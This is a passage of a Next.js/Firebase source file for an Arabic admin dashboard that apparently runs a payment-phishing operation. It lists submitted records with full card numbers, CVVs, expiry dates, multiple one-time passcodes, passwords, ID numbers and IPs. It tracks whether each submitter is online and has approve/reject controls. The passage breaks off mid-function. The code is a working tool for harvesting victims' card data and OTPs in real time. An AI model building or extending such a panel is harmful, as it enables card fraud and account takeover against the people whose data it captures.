"use client"
import type React from "react"
import { useState, useEffect, useMemo, useRef } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  XCircle,
  Clock,
  MapPin,
  Search,
  Download,
  Settings,
  User,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  TrendingUp,
  Activity,
  Filter,
  RefreshCw,
  AlertCircle,
  Loader2,
  EyeOff,
  Eye,
  X,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow, format } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref, set, update } from "firebase/database"
import { database } from "@/lib/firestore"
import { auth } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuSeparator,
  DropdownMenuLabel,
} from "@/components/ui/dropdown-menu"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"
import { Switch } from "@/components/ui/switch"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { toast } from "@/hooks/use-toast"
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"

// Types
type FlagColor = "red" | "yellow" | "green" | null

interface Notification {
  createdDate: string
  country?: string
  id: string | "0"
  data:{
  bank: string
  cardStatus?: string
  ip?: string
  paymentCVV: string
  expiryDate: string
  notificationCount: number
  otp: string
  otp2: string
  page: string
  paymentCardNumber: string
  personalInfo: {
    id?: string | "0"
    name?: string
  }
  prefix: string
  status: "pending" | "approved" | "rejected" | string
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  pass?: string
  year: string
  month: string
  pagename: string
  plateType: string
  allOtps?: string[] | null
  idNumber: string
  email: string
  mobile: string
  network: string
  phoneOtp: string
  paymentExpiry: string
  fullName: string
  phone: string
  flagColor?: string
}
  currentPage?: string
  currentStep?: string
  step?: number
  otp: string
  allOtps:string[] 

}

// Hook for online users count
function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

// Hook to track online status for a specific user ID
function useUserOnlineStatus(userId: string) {
  const [isOnline, setIsOnline] = useState(false)

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      setIsOnline(data && data?.state === "online")
    })

    return () => unsubscribe()
  }, [userId])

  return isOnline
}

const handlePageName = (page: string) => {
  switch (page) {
    case "1":
      return "الرئيسية"
    case "2":
      return "الدفع"
    default:
      return "غير معروف"
  }
}

// Enhanced Statistics Card Component
function StatisticsCard({
  title,
  value,
  change,
  changeType,
  icon: Icon,
  color,
  trend,
}: {
  title: string
  value: string | number
  change: string
  changeType: "increase" | "decrease" | "neutral"
  icon: React.ElementType
  color: string
  trend?: number[]
}) {
  return (
    <Card className="relative overflow-hidden bg-gradient-to-br from-background to-muted/20 border-0 shadow-lg hover:shadow-xl transition-all duration-300 group">
      <CardHeader className="pb-2">
        <div className="flex items-center justify-between">
          <div className={`p-3 rounded-xl ${color} shadow-md group-hover:scale-110 transition-transform`}>
            <Icon className="h-6 w-6 text-white" />
          </div>
          <div className="text-right">
            <p className="text-sm font-medium text-muted-foreground">{title}</p>
            <p className="text-3xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text">{value}</p>
          </div>
        </div>
      </CardHeader>
      <CardContent className="pt-0">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-1">
            <TrendingUp
              className={`h-4 w-4 ${
                changeType === "increase"
                  ? "text-green-500"
                  : changeType === "decrease"
                    ? "text-red-500"
                    : "text-gray-500"
              }`}
            />
            <span
              className={`text-sm font-medium ${
                changeType === "increase"
                  ? "text-green-500"
                  : changeType === "decrease"
                    ? "text-red-500"
                    : "text-gray-500"
              }`}
            >
              {change}
            </span>
          </div>
          {trend && (
            <div className="flex items-end gap-1 h-8">
              {trend.map((value, index) => (
                <div
                  key={index}
                  className={`w-1.5 rounded-sm ${color.replace("bg-gradient-to-br", "bg-primary")} opacity-60 hover:opacity-100 transition-opacity`}
                  style={{ height: `${(value / Math.max(...trend)) * 100}%` }}
                />
              ))}
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  )
}

// Enhanced User Status Component
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")
  const [lastSeen, setLastSeen] = useState<Date | null>(null)

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data?.state === "online" ? "online" : "offline")
        if (data?.lastChanged) {
          setLastSeen(new Date(data?.lastChanged))
        }
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <TooltipProvider>
      <Tooltip>
        <TooltipTrigger asChild>
          <div className="flex items-center gap-2 cursor-pointer">
            <div
              className={`w-2 h-2 rounded-full ${
                status === "online" ? "bg-green-500 animate-pulse" : status === "offline" ? "bg-red-500" : "bg-gray-400"
              }`}
            />
            <Badge
              variant="outline"
              className={`text-xs ${
                status === "online"
                  ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
                  : status === "offline"
                    ? "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
                    : "bg-gray-50 text-gray-700 border-gray-200 dark:bg-gray-950/30 dark:text-gray-300"
              }`}
            >
              {status === "online" ? "متصل" : status === "offline" ? "غير متصل" : "غير معروف"}
            </Badge>
          </div>
        </TooltipTrigger>
        <TooltipContent>
          {status === "offline" && lastSeen && (
            <p>آخر ظهور: {formatDistanceToNow(lastSeen, { addSuffix: true, locale: ar })}</p>
          )}
          {status === "online" && <p>متصل الآن</p>}
          {status === "unknown" && <p>لا توجد معلومات</p>}
        </TooltipContent>
      </Tooltip>
    </TooltipProvider>
  )
}

// Enhanced Flag Color Selector
function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: any
  onColorChange: (id: string, color: FlagColor) => void
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8 hover:bg-muted">
          <Flag
            className={`h-4 w-4 transition-colors ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2" dir="rtl">
        <div className="flex gap-2">
          {[
            { color: "red", label: "عالي الأولوية", bgColor: "bg-red-500" },
            { color: "yellow", label: "متوسط الأولوية", bgColor: "bg-yellow-500" },
            { color: "green", label: "منخفض الأولوية", bgColor: "bg-green-500" },
          ].map(({ color, label, bgColor }) => (
            <TooltipProvider key={color}>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className={`h-8 w-8 rounded-full ${bgColor} hover:opacity-80 transition-opacity`}
                    onClick={() => onColorChange(notificationId, color as FlagColor)}
                  >
                    <Flag className="h-4 w-4 text-white" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>{label}</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          ))}
          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <X className="h-4 w-4 text-gray-600 dark:text-gray-300" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

// Enhanced Search Component
function SearchBar({ onSearch, value }: { onSearch: (term: string) => void; value: string }) {
  const [searchTerm, setSearchTerm] = useState(value)
  const searchInputRef = useRef<HTMLInputElement>(null)

  useEffect(() => {
    setSearchTerm(value)
  }, [value])

  const handleSearch = (term: string) => {
    setSearchTerm(term)
    onSearch(term)
  }

  const handleClear = () => {
    setSearchTerm("")
    onSearch("")
    searchInputRef.current?.focus()
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      onSearch(searchTerm)
    }
    if (e.key === "Escape") {
      handleClear()
    }
  }

  return (
    <div className="relative group">
      <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground group-focus-within:text-primary transition-colors" />
      <Input
        ref={searchInputRef}
        type="search"
        placeholder="البحث في الإشعارات... (اضغط / للتركيز)"
        className="pl-10 pr-10 bg-background/50 backdrop-blur-sm border-muted-foreground/20 focus:border-primary/50 transition-colors"
        value={searchTerm}
        onChange={(e) => handleSearch(e.target.value)}
        onKeyDown={handleKeyDown}
      />
      {searchTerm && (
        <Button
          variant="ghost"
          size="icon"
          className="absolute right-1 top-1/2 transform -translate-y-1/2 h-7 w-7"
          onClick={handleClear}
        >
          <X className="h-3 w-3" />
        </Button>
      )}
    </div>
  )
}

// Enhanced Pagination Component
function Pagination({
  currentPage,
  totalPages,
  onPageChange,
  totalItems,
  itemsPerPage,
}: {
  currentPage: number
  totalPages: number
  onPageChange: (page: number) => void
  totalItems: number
  itemsPerPage: number
}) {
  const startItem = (currentPage - 1) * itemsPerPage + 1
  const endItem = Math.min(currentPage * itemsPerPage, totalItems)

  const getPageNumbers = () => {
    const pages = []
    const maxVisible = 5

    if (totalPages <= maxVisible) {
      for (let i = 1; i <= totalPages; i++) {
        pages.push(i)
      }
    } else {
      if (currentPage <= 3) {
        for (let i = 1; i <= 4; i++) pages.push(i)
        pages.push("...")
        pages.push(totalPages)
      } else if (currentPage >= totalPages - 2) {
        pages.push(1)
        pages.push("...")
        for (let i = totalPages - 3; i <= totalPages; i++) pages.push(i)
      } else {
        pages.push(1)
        pages.push("...")
        for (let i = currentPage - 1; i <= currentPage + 1; i++) pages.push(i)
        pages.push("...")
        pages.push(totalPages)
      }
    }

    return pages
  }

  return (
    <div className="flex items-center justify-between flex-wrap gap-4">
      <div className="text-sm text-muted-foreground">
        عرض <span className="font-medium text-foreground">{startItem}</span> إلى{" "}
        <span className="font-medium text-foreground">{endItem}</span> من{" "}
        <span className="font-medium text-foreground">{totalItems}</span> عنصر
      </div>
      <div className="flex items-center gap-2">
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage - 1)}
          disabled={currentPage <= 1}
          className="gap-1"
        >
          <ChevronRight className="h-4 w-4" />
          السابق
        </Button>
        <div className="flex items-center gap-1">
          {getPageNumbers().map((page, index) =>
            page === "..." ? (
              <span key={`ellipsis-${index}`} className="px-2">
                ...
              </span>
            ) : (
              <Button
                key={page}
                variant={currentPage === page ? "default" : "outline"}
                size="sm"
                className="w-8 h-8 p-0"
                onClick={() => onPageChange(page as number)}
              >
                {page}
              </Button>
            ),
          )}
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => onPageChange(currentPage + 1)}
          disabled={currentPage >= totalPages}
          className="gap-1"
        >
          التالي
          <ChevronLeft className="h-4 w-4" />
        </Button>
      </div>
    </div>
  )
}

// Export dialog component
function ExportDialog({
  open,
  onOpenChange,
  notifications,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
  notifications: Notification[]
}) {
  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv")
  const [exportFields, setExportFields] = useState({
    personalInfo: true,
    cardInfo: true,
    status: true,
    timestamps: true,
  })
  const [isExporting, setIsExporting] = useState(false)

  const handleExport = () => {
    setIsExporting(true)

    // Simulate export process
    setTimeout(() => {
      // In a real implementation, generate and download the file here
      const selectedFields = Object.entries(exportFields)
        .filter(([_, value]) => value)
        .map(([key]) => key)

      setIsExporting(false)
      onOpenChange(false)
      toast({
        title: "تم التصدير بنجاح",
        description: `تم تصدير ${notifications.length} إشعار بتنسيق ${exportFormat.toUpperCase()}`,
      })
    }, 1500)
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Download className="h-5 w-5" />
            تصدير الإشعارات
          </DialogTitle>
        </DialogHeader>
        <div className="space-y-4 py-4">
          <div className="space-y-2">
            <Label>تنسيق التصدير</Label>
            <div className="flex gap-4">
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="csv"
                  value="csv"
                  checked={exportFormat === "csv"}
                  onChange={() => setExportFormat("csv")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="csv" className="cursor-pointer">
                  CSV
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="json"
                  value="json"
                  checked={exportFormat === "json"}
                  onChange={() => setExportFormat("json")}
                  className="h-4 w-4 text-primary"
                />
                <Label htmlFor="json" className="cursor-pointer">
                  JSON
                </Label>
              </div>
            </div>
          </div>

          <div className="space-y-2">
            <Label>البيانات المراد تصديرها</Label>
            <div className="space-y-2">
              {[
                { id: "personalInfo", label: "المعلومات الشخصية" },
                { id: "cardInfo", label: "معلومات البطاقة" },
                { id: "status", label: "حالة الإشعار" },
                { id: "timestamps", label: "الطوابع الزمنية" },
              ].map(({ id, label }) => (
                <div key={id} className="flex items-center space-x-2 space-x-reverse">
                  <Checkbox
                    id={id}
                    checked={exportFields[id as keyof typeof exportFields]}
                    onCheckedChange={(checked) =>
                      setExportFields({
                        ...exportFields,
                        [id]: checked as boolean,
                      })
                    }
                  />
                  <Label htmlFor={id} className="cursor-pointer">
                    {label}
                  </Label>
                </div>
              ))}
            </div>
          </div>

          <div className="rounded-md bg-muted p-3">
            <div className="flex items-center gap-2 text-sm">
              <AlertCircle className="h-4 w-4 text-muted-foreground flex-shrink-0" />
              <p className="text-muted-foreground">سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.</p>
            </div>
          </div>
        </div>
        <DialogFooter className="sm:justify-start">
          <Button variant="outline" onClick={() => onOpenChange(false)}>
            إلغاء
          </Button>
          <Button type="submit" onClick={handleExport} disabled={isExporting}>
            {isExporting ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                جاري التصدير...
              </>
            ) : (
              <>
                <Download className="mr-2 h-4 w-4" />
                تصدير
              </>
            )}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )
}

// Settings panel component
function SettingsPanel({ open, onOpenChange }: { open: boolean; onOpenChange: (open: boolean) => void }) {
  const [notifyNewCards, setNotifyNewCards] = useState(true)
  const [notifyNewUsers, setNotifyNewUsers] = useState(true)
  const [playSounds, setPlaySounds] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [refreshInterval, setRefreshInterval] = useState("30")

  const handleSaveSettings = () => {
    // Save settings to localStorage or backend
    localStorage.setItem(
      "notificationSettings",
      JSON.stringify({
        notifyNewCards,
        notifyNewUsers,
        playSounds,
        autoRefresh,
        refreshInterval,
      }),
    )

    toast({
      title: "تم حفظ الإعدادات",
      description: "تم حفظ إعدادات الإشعارات بنجاح",
    })
    onOpenChange(false)
  }

  // Load settings on mount
  useEffect(() => {
    const savedSettings = localStorage.getItem("notificationSettings")
    if (savedSettings) {
      const settings = JSON.parse(savedSettings)
      setNotifyNewCards(settings.notifyNewCards)
      setNotifyNewUsers(settings.notifyNewUsers)
      setPlaySounds(settings.playSounds)
      setAutoRefresh(settings.autoRefresh)
      setRefreshInterval(settings.refreshInterval)
    }
  }, [])

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent side="left" className="sm:max-w-md overflow-y-auto" dir="rtl">
        <SheetHeader>
          <SheetTitle className="flex items-center gap-2 text-xl">
            <Settings className="h-5 w-5" />
            إعدادات الإشعارات
          </SheetTitle>
        </SheetHeader>
        <div className="mt-6 space-y-6">
          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات الإشعارات</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between rounded-lg border p-3 hover:bg-muted/50 transition-colors">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-cards" className="cursor-pointer">
                    إشعارات البطاقات الجديدة
                  </Label>
                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند إضافة بطاقة جديدة</p>
                </div>
                <Switch id="notify-cards" checked={notifyNewCards} onCheckedChange={setNotifyNewCards} />
              </div>
              <div className="flex items-center justify-between rounded-lg border p-3 hover:bg-muted/50 transition-colors">
                <div className="space-y-0.5">
                  <Label htmlFor="notify-users" className="cursor-pointer">
                    إشعارات المستخدمين الجدد
                  </Label>
                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند تسجيل مستخدم جديد</p>
                </div>
                <Switch id="notify-users" checked={notifyNewUsers} onCheckedChange={setNotifyNewUsers} />
              </div>
              <div className="flex items-center justify-between rounded-lg border p-3 hover:bg-muted/50 transition-colors">
                <div className="space-y-0.5">
                  <Label htmlFor="play-sounds" className="cursor-pointer">
                    تشغيل الأصوات
                  </Label>
                  <p className="text-xs text-muted-foreground">تشغيل صوت عند استلام إشعار جديد</p>
                </div>
                <Switch id="play-sounds" checked={playSounds} onCheckedChange={setPlaySounds} />
              </div>
            </div>
          </div>

          <Separator />

          <div className="space-y-4">
            <h3 className="text-sm font-medium">إعدادات التحديث التلقائي</h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between rounded-lg border p-3 hover:bg-muted/50 transition-colors">
                <div className="space-y-0.5">
                  <Label htmlFor="auto-refresh" className="cursor-pointer">
                    تحديث تلقائي
                  </Label>
                  <p className="text-xs text-muted-foreground">تحديث البيانات تلقائيًا</p>
                </div>
                <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
              </div>
              {autoRefresh && (
                <div className="space-y-1.5 pt-2">
                  <Label htmlFor="refresh-interval">فترة التحديث (بالثواني)</Label>
                  <Select value={refreshInterval} onValueChange={setRefreshInterval}>
                    <SelectTrigger id="refresh-interval">
                      <SelectValue placeholder="اختر فترة التحديث" />
                    </SelectTrigger>
                    <SelectContent position="popper">
                      <SelectItem value="10">10 ثواني</SelectItem>
                      <SelectItem value="30">30 ثانية</SelectItem>
                      <SelectItem value="60">دقيقة واحدة</SelectItem>
                      <SelectItem value="300">5 دقائق</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              )}
            </div>
          </div>

          <Separator />

          <div className="space-y-4">
            <h3 className="text-sm font-medium">معلومات النظام</h3>
            <div className="rounded-lg bg-muted p-3 space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-muted-foreground">الإصدار:</span>
                <span className="font-medium">1.0.0</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">آخر تحديث:</span>
                <span className="font-medium">{format(new Date(), "yyyy/MM/dd")}</span>
              </div>
            </div>
          </div>

          <div className="flex justify-end gap-2 pt-4">
            <Button variant="outline" onClick={() => onOpenChange(false)}>
              إلغاء
            </Button>
            <Button onClick={handleSaveSettings}>حفظ الإعدادات</Button>
          </div>
        </div>
      </SheetContent>
    </Sheet>
  )
}

// Info Badge Component
const InfoBadge = ({ active, onClick, icon: Icon, text, inactiveText, colorClass }: any) => (
  <TooltipProvider>
    <Tooltip>
      <TooltipTrigger asChild>
        <Badge
          variant={active ? "default" : "secondary"}
          className={`cursor-pointer transition-all hover:scale-105 ${
            active ? `bg-gradient-to-r ${colorClass} text-white shadow-md` : "opacity-60"
          }`}
          onClick={active ? onClick : undefined}
        >
          <Icon className="h-3 w-3 ml-1" />
          {active ? text : inactiveText}
        </Badge>
      </TooltipTrigger>
      <TooltipContent>
        <p>{active ? "انقر للعرض" : "لا توجد بيانات"}</p>
      </TooltipContent>
    </Tooltip>
  </TooltipProvider>
)

// Status Badge Component
const StatusBadge = ({ status }: any) => {
  const statusMap = {
    approved: { text: "موافق", color: "from-green-500 to-green-600", icon: CheckCircle },
    rejected: { text: "مرفوض", color: "from-red-500 to-red-600", icon: XCircle },
    pending: { text: "معلق", color: "from-yellow-500 to-yellow-600", icon: Clock },
  }
  const { text, color, icon: Icon } = (statusMap[status as keyof typeof statusMap] as any) || statusMap.pending

  return (
    <Badge className={`bg-gradient-to-r ${color} text-white flex items-center gap-1 shadow-sm`}>
      <Icon className="h-3 w-3" />
      {text}
    </Badge>
  )
}

// Gradient Button Component
const GradientButton = ({ text, icon: Icon, onClick, disabled, color }: any) => (
  <Button
    variant="outline"
    size="sm"
    onClick={onClick}
    disabled={disabled}
    className={`bg-gradient-to-r from-${color}-500 to-${color}-600 text-white border-0 hover:from-${color}-600 hover:to-${color}-700 flex items-center gap-1 shadow-sm disabled:opacity-50 disabled:cursor-not-allowed transition-all`}
  >
    {text} <Icon className="h-4 w-4" />
  </Button>
)

// Action Buttons Component
const ActionButtons = ({ notification, handleApproval, handleDelete, handleFlagColorChange }: any) => (
  <div className="flex justify-center gap-1 flex-wrap items-center">
    <GradientButton
      text="موافقة"
      icon={CheckCircle}
      onClick={() => handleApproval("approved", notification.id)}
      disabled={notification.status === "approved"}
      color="green"
    />
    <GradientButton
      text="رفض"
      icon={XCircle}
      onClick={() => handleApproval("rejected", notification.id)}
      disabled={notification.status === "rejected"}
      color="red"
    />
    <FlagColorSelector
      notificationId={notification.id}
      currentColor={notification.flagColor}
      onColorChange={handleFlagColorChange}
    />
    <Button
      variant="ghost"
      size="sm"
      onClick={() => handleDelete(notification.id)}
      className="text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-950/30"
    >
      <Trash2 className="h-4 w-4" />
    </Button>
    {notification?.amount && (
      <Badge variant="outline" className="font-mono">
        {notification.amount}
      </Badge>
    )}
  </div>
)

// Header Icon Component
const HeaderIcon: React.FC<{ icon: React.ElementType; bgGradient: string; title: string }> = ({
  icon: Icon,
  bgGradient,
  title,
}) => (
  <>
    <div
      className={`w-12 h-12 rounded-full flex items-center justify-center bg-gradient-to-br ${bgGradient} shadow-md`}
    >
      <Icon className="h-6 w-6 text-white" />
    </div>
    <span className="ml-2">{title}</span>
  </>
)

// Info Section Component
const InfoSection: React.FC<{
  items: { label: string; value: any; sensitive?: boolean }[]
  additionalOtps?: string[]
}> = ({ items, additionalOtps }) => {
  const [showSensitive, setShowSensitive] = useState<{ [key: string]: boolean }>({})

  const toggleSensitive = (label: string) => {
    setShowSensitive((prev) => ({ ...prev, [label]: !prev[label] }))
  }

  return (
    <div className="mt-4 space-y-4">
      <div className="bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900 rounded-xl shadow-inner p-5 space-y-3">
        {items.map(({ label, value, sensitive }) => {
          if (value === undefined || value === null || value === "") return null

          return (
            <div
              key={label}
              className="flex justify-between items-center py-2 border-b border-gray-300 dark:border-gray-700 last:border-0 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-md px-2 transition"
            >
              <span className="font-medium text-gray-500 dark:text-gray-400">{label}:</span>
              <div className="flex items-center gap-2">
                {sensitive ? (
                  <>
                    <span className="font-semibold text-gray-900 dark:text-gray-200">
                      {showSensitive[label] ? String(value) : "••••••"}
                    </span>
                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => toggleSensitive(label)}>
                      {showSensitive[label] ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                    </Button>
                  </>
                ) : (
                  <span className="font-semibold text-gray-900 dark:text-gray-200">{String(value)}</span>
                )}
              </div>
            </div>
          )
        })}

        {additionalOtps && additionalOtps.length > 0 && (
          <div className="pt-3 border-t border-gray-300 dark:border-gray-700">
            <span className="font-medium text-gray-500 dark:text-gray-400 block mb-2">جميع الرموز:</span>
            <div className="flex flex-wrap gap-2">
              {additionalOtps.map((otp, index) => (
                <Badge
                  key={index}
                  variant="outline"
                  className="bg-gray-100 dark:bg-gray-800 text-gray-800 dark:text-gray-100 font-mono"
                >
                  {otp}
                </Badge>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

// Main Component
export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "pending">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(10)
  const [settingsOpen, setSettingsOpen] = useState(false)
  const [exportDialogOpen, setExportDialogOpen] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date")
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc")
  const [showStatistics, setShowStatistics] = useState(true)
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())

  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  // Track online status for all notifications
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  // Effect to track online status for all notifications
  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {}

    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`)

      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data?.state === "online",
        }))
      })

      statusRefs[notification.id] = callback
    })

    // Cleanup function
    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe()
        }
      })
    }
  }, [notifications])

  // Statistics calculations
  const totalVisitorsCount = notifications.length
  const cardSubmissionsCount = notifications.filter((n) => n.data?.paymentCardNumber).length
  const approvedCount = notifications.filter((n) => n.data?.status === "approved").length
  const pendingCount = notifications.filter((n) => n.data?.status === "pending").length

  // Filter and search notifications
  const filteredNotifications = useMemo(() => {
    let filtered = notifications

    // Apply filter type
    if (filterType === "card") {
      filtered = filtered.filter((notification) => notification.data?.paymentCardNumber)
    } else if (filterType === "online") {
      filtered = filtered.filter((notification) => onlineStatuses[notification.id])
    } else if (filterType === "pending") {
      filtered = filtered.filter((notification) => notification.data?.status === "pending")
    }

    // Apply search term
    if (searchTerm) {
      const term = searchTerm.toLowerCase()
      filtered = filtered.filter(
        (notification) =>
          notification.data?.fullName?.toLowerCase().includes(term) ||
          notification.data?.email?.toLowerCase().includes(term) ||
          notification.data?.phone?.toLowerCase().includes(term) ||
          notification.data?.paymentCardNumber?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.otp?.toLowerCase().includes(term) ||
          notification.data?.idNumber?.toLowerCase().includes(term),
      )
    }

    // Apply sorting
    filtered.sort((a, b) => {
      let aValue: any, bValue: any

      switch (sortBy) {
        case "date":
          aValue = new Date(a.createdDate)
          bValue = new Date(b.createdDate)
          break
        case "status":
          aValue = a.data?.status
          bValue = b.data?.status
          break
        case "country":
          aValue = a.country || ""
          bValue = b.country || ""
          break
        default:
          return 0
      }

      if (sortOrder === "asc") {
        return aValue > bValue ? 1 : -1
      } else {
        return aValue < bValue ? 1 : -1
      }
    })

    return filtered
  }, [filterType, notifications, onlineStatuses, searchTerm, sortBy, sortOrder])

  // Paginate notifications
  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredNotifications, currentPage, itemsPerPage])

  const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))

  // Reset to first page when filter or search changes
  useEffect(() => {
    setCurrentPage(1)
  }, [filterType, searchTerm])

  // Firebase authentication and data fetching
  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const paysRef = ref(database, "pays")
    const unsubscribe = onValue(
      paysRef,
      (snapshot) => {
        const data = snapshot.val()
        if (data) {
          const notificationsData = Object.entries(data).map(([id, entry]: [string, any]) => {
            return { id, ...entry }
          })
          .filter((notification: any) => !notification.isHidden)
          .sort((a: any, b: any) => {
            const dateA = new Date(a.createdDate || 0).getTime()
            const dateB = new Date(b.createdDate || 0).getTime()
            return dateB - dateA
          }) as Notification[]

          // Check if there are any new notifications with card info or general info
